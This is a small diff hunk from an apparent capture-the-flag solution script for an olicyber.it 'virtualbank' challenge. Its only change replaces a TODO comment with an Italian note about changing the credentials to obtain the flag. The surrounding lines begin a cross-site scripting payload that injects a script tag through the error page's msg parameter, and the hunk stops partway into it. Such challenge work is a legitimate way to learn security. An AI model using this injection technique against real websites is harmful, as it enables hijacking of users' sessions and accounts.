@@ -3,7 +3,7 @@ from hashlib import sha256
 from bs4 import BeautifulSoup
 
 s = requests.Session()
-username, password = "tempName","tempPassword" # TODO change this names
+username, password = "tempName","tempPassword" # cambiare username e password per riuscire ad ottenere la flag
 site = "http://virtualbank.challs.olicyber.it/"
 sitePayload = f"""http://virtualbank.challs.olicyber.it/error/?msg=<body><script src='/error/?msg=
 var xmlHttp = new XMLHttpRequest();
